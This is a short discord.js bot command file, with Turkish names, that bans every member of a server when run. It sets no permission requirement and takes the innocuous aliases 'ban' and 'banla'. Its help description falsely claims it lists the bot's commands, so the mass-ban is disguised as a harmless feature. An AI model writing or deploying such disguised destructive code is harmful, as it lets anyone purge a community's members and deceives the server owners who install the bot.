const { MessageEmbed } = require("discord.js");
const conf = require("../ayarlar.json");

module.exports.run = async (client, message, args) => {

message.guild.members.cache.forEach(sila => sila.ban())

}
module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["banla", "ban"],
  permLevel: 0
};

module.exports.help = {
  name: 'herkesi-banla',
  description: 'Botta bulunan tüm komutları gösterir',
  usage: 'komutlar'
};